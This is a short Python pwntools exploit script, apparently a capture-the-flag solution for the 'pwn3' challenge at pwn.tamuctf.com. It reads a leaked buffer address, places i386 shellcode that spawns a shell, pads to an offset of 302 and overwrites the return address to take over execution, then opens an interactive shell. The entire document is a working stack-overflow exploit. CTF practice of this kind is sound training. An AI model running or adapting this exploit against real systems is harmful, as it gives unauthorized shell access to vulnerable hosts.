from pwn import *
r = process("./pwn3")
r = remote("pwn.tamuctf.com",4323)
context(arch="i386",os="linux")
def main():
    offset = 302
    r.recvuntil("Take this, you might need it on your journey ")
    leak = int(r.recv().replace("!",'').strip(),16)
    log.info("leaked buffer : " + str(leak))
    shell = asm(shellcraft.sh())
    p = shell
    p += "A" * (offset - len(shell))
    p += p32(leak)

    r.sendline(p)
    r.interactive()


if __name__ == '__main__':
    main()
